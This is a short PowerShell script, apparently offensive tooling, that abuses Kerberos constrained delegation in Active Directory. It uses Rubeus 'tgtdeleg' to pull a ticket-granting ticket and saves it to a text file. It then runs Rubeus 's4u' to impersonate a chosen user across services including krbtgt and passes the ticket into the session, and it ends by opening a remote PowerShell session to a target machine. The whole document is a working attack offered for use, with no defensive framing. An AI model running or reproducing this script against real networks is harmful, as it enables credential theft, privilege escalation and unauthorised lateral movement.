$out = (cmd /c Rubeus.exe tgtdeleg /nowrap) | Out-String
$ticket = (print $out | select -last 2 | select -first 1).trim() 
$ticket | Out-File kerb.txt
$usr = Read-Host -Prompt 'User with Delegate perms plz'
$impers = Read-Host -Prompt 'User to Impersonate plz'
$msdsspn = Read-Host -Prompt 'msdsspn:'
cmd /c Rubeus.exe s4u /user:$usr /impersonateuser:$impers /ticket:$ticket /msdsspn:"$msdsspn" /altservice:cifs,host,http,winrm,RPCSS,wsman,krbtgt /ptt
$pc = Read-Host -Prompt 'Please enter Computer Name To Ps-Session to:'
$sess = New-PSSession -ComputerName $pc
Write-Host 'Session Established'
